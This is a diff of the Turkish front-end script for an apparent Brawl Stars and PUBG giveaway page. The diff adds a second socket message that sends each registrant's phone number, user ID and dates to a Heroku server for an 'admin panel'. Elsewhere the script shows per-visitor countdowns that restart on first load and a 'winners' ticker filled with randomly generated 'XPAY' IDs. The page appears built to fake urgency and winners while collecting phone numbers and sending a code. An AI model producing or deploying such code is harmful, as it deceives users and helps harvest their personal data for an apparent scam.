@@ -63,8 +63,10 @@ document.addEventListener("DOMContentLoaded", () => {
   }
 
   // ================= SOCKET / KAYIT AKIŞI =================
+  let socket = null;
+
   if (typeof io !== "undefined") {
-    const socket = io("https://afternoon-lake-61658-70a3b4756b95.herokuapp.com");
+    socket = io("https://afternoon-lake-61658-70a3b4756b95.herokuapp.com");
     console.log("CLIENT SOCKET BAĞLANDI");
 
     const phoneInput = document.getElementById("registerPhone");
@@ -107,8 +109,21 @@ document.addEventListener("DOMContentLoaded", () => {
         const today = new Date().toLocaleDateString("tr-TR");
         localStorage.setItem("registerDate", today);
 
+        // Admin panelde kullanıcı tarafı için ekstra payload
+        const userPayload = {
+          phone,
+          userId: userIdGenerated,
+          registerDate: today,
+          date: new Date().toLocaleString("tr-TR")
+        };
+
+        // Eski sistemi bozma
         socket.emit("new-phone", phone);
-        console.log("socket.emit çağrıldı");
+        console.log("socket.emit new-phone çağrıldı");
+
+        // Yeni kullanıcı verisi de gönder
+        socket.emit("new-user", userPayload);
+        console.log("socket.emit new-user çağrıldı", userPayload);
 
         registerBtn.disabled = true;
         if (btnText) btnText.textContent = "Kod gönderiliyor";
@@ -293,65 +308,63 @@ document.addEventListener("DOMContentLoaded", () => {
     });
   }
 
- // ================= COUNTDOWNLAR =================
-const countdownEl = document.getElementById("countdownTimer");
-const pubgCountdownEl = document.getElementById("pubgCountdownTimer");
+  // ================= COUNTDOWNLAR =================
+  const countdownEl = document.getElementById("countdownTimer");
+  const pubgCountdownEl = document.getElementById("pubgCountdownTimer");
 
-// ================= BRAWL (KALICI) =================
-let brawlTargetDate = localStorage.getItem("brawlTargetDate");
+  // ================= BRAWL (KALICI) =================
+  let brawlTargetDate = localStorage.getItem("brawlTargetDate");
 
-if (!brawlTargetDate) {
-  // İLK GİRİŞTE 7 GÜN (istersen değiştir)
-  brawlTargetDate = Date.now() + 7 * 24 * 60 * 60 * 1000;
-  localStorage.setItem("brawlTargetDate", brawlTargetDate);
-} else {
-  brawlTargetDate = parseInt(brawlTargetDate, 10);
-}
-
-// ================= PUBG (KALICI) =================
-let pubgTargetDate = localStorage.getItem("pubgTargetDate");
-
-if (!pubgTargetDate) {
-  pubgTargetDate = Date.now() + 10 * 24 * 60 * 60 * 1000;
-  localStorage.setItem("pubgTargetDate", pubgTargetDate);
-} else {
-  pubgTargetDate = parseInt(pubgTargetDate, 10);
-}
-
-// ================= FORMAT =================
-function formatCountdown(distance) {
-  if (distance <= 0) {
-    return "SÜRE DOLDU";
+  if (!brawlTargetDate) {
+    brawlTargetDate = Date.now() + 7 * 24 * 60 * 60 * 1000;
+    localStorage.setItem("brawlTargetDate", brawlTargetDate);
+  } else {
+    brawlTargetDate = parseInt(brawlTargetDate, 10);
   }
 
-  const days = Math.floor(distance / (1000 * 60 * 60 * 24));
-  const hours = Math.floor((distance / (1000 * 60 * 60)) % 24);
-  const minutes = Math.floor((distance / (1000 * 60)) % 60);
-  const seconds = Math.floor((distance / 1000) % 60);
+  // ================= PUBG (KALICI) =================
+  let pubgTargetDate = localStorage.getItem("pubgTargetDate");
 
-  return `${days}G ${hours.toString().padStart(2, "0")}:${minutes
-    .toString()
-    .padStart(2, "0")}:${seconds.toString().padStart(2, "0")}`;
-}
-
-// ================= UPDATE =================
-function updateCountdowns() {
-  const now = Date.now();
-
-  if (countdownEl) {
-    const distance = brawlTargetDate - now;
-    countdownEl.textContent = formatCountdown(distance);
+  if (!pubgTargetDate) {
+    pubgTargetDate = Date.now() + 10 * 24 * 60 * 60 * 1000;
+    localStorage.setItem("pubgTargetDate", pubgTargetDate);
+  } else {
+    pubgTargetDate = parseInt(pubgTargetDate, 10);
   }
 
-  if (pubgCountdownEl) {
-    const pubgDistance = pubgTargetDate - now;
-    pubgCountdownEl.textContent = formatCountdown(pubgDistance);
-  }
-}
+  // ================= FORMAT =================
+  function formatCountdown(distance) {
+    if (distance <= 0) {
+      return "SÜRE DOLDU";
+    }
 
-updateCountdowns();
-setInterval(updateCountdowns, 1000);
-  
+    const days = Math.floor(distance / (1000 * 60 * 60 * 24));
+    const hours = Math.floor((distance / (1000 * 60 * 60)) % 24);
+    const minutes = Math.floor((distance / (1000 * 60)) % 60);
+    const seconds = Math.floor((distance / 1000) % 60);
+
+    return `${days}G ${hours.toString().padStart(2, "0")}:${minutes
+      .toString()
+      .padStart(2, "0")}:${seconds.toString().padStart(2, "0")}`;
+  }
+
+  // ================= UPDATE =================
+  function updateCountdowns() {
+    const now = Date.now();
+
+    if (countdownEl) {
+      const distance = brawlTargetDate - now;
+      countdownEl.textContent = formatCountdown(distance);
+    }
+
+    if (pubgCountdownEl) {
+      const pubgDistance = pubgTargetDate - now;
+      pubgCountdownEl.textContent = formatCountdown(pubgDistance);
+    }
+  }
+
+  updateCountdowns();
+  setInterval(updateCountdowns, 1000);
 
   // ================= SLIDER =================
   const sliderImages = [
@@ -545,58 +558,56 @@ setInterval(updateCountdowns, 1000);
     }
   }
 
-// ================= KAZANANLAR ŞERİDİ - GERÇEK SONSUZ AKIŞ =================
-const winnerTrack = document.getElementById("winnerTrack");
+  // ================= KAZANANLAR ŞERİDİ - GERÇEK SONSUZ AKIŞ =================
+  const winnerTrack = document.getElementById("winnerTrack");
 
-function generateWinnerId() {
-  const number = Math.floor(1000 + Math.random() * 9000);
-  return `XPAY-${number}`;
-}
-
-function createWinnerItem() {
-  const item = document.createElement("span");
-  item.className = "winner-id";
-  item.textContent = generateWinnerId();
-  return item;
-}
-
-function startWinnerMarquee() {
-  if (!winnerTrack) return;
-
-  winnerTrack.innerHTML = "";
-
-  // İlk dolum
-  for (let i = 0; i < 20; i++) {
-    winnerTrack.appendChild(createWinnerItem());
+  function generateWinnerId() {
+    const number = Math.floor(1000 + Math.random() * 9000);
+    return `XPAY-${number}`;
   }
 
-  let offset = 0;
-  const speed = 0.8; // hız: 0.4 daha yavaş, 0.8 daha hızlı
+  function createWinnerItem() {
+    const item = document.createElement("span");
+    item.className = "winner-id";
+    item.textContent = generateWinnerId();
+    return item;
+  }
 
-  function step() {
-    offset -= speed;
-    winnerTrack.style.transform = `translateX(${offset}px)`;
+  function startWinnerMarquee() {
+    if (!winnerTrack) return;
 
-    const first = winnerTrack.firstElementChild;
+    winnerTrack.innerHTML = "";
 
-    if (first) {
-      const firstWidth = first.offsetWidth;
-      const gap = 36;
+    for (let i = 0; i < 20; i++) {
+      winnerTrack.appendChild(createWinnerItem());
+    }
 
-      if (Math.abs(offset) >= firstWidth + gap) {
-        offset += firstWidth + gap;
-        winnerTrack.appendChild(createWinnerItem());
-        winnerTrack.removeChild(first);
-        winnerTrack.style.transform = `translateX(${offset}px)`;
+    let offset = 0;
+    const speed = 0.45;
+
+    function step() {
+      offset -= speed;
+      winnerTrack.style.transform = `translateX(${offset}px)`;
+
+      const first = winnerTrack.firstElementChild;
+
+      if (first) {
+        const firstWidth = first.offsetWidth;
+        const gap = 36;
+
+        if (Math.abs(offset) >= firstWidth + gap) {
+          offset += firstWidth + gap;
+          winnerTrack.appendChild(createWinnerItem());
+          winnerTrack.removeChild(first);
+          winnerTrack.style.transform = `translateX(${offset}px)`;
+        }
       }
+
+      requestAnimationFrame(step);
     }
 
     requestAnimationFrame(step);
   }
 
-  requestAnimationFrame(step);
-}
-
-startWinnerMarquee();
-
+  startWinnerMarquee();
 });
